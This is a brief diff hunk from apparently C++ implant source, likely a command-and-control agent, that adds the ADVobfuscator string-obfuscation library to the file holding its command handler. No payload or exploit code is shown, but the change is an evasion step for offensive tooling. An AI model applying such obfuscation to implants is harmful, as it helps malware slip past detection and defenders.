@@ -3,8 +3,11 @@
 #include "utils.h"
 #include "constants.h"
 #include "implant.h"
+#include "obfuscator/MetaString.h"
 
 using namespace std;
+using namespace andrivet::ADVobfuscator;
+
 
 void HandleCmd(Task* task, MalleableProfile* currentProfile)
 {
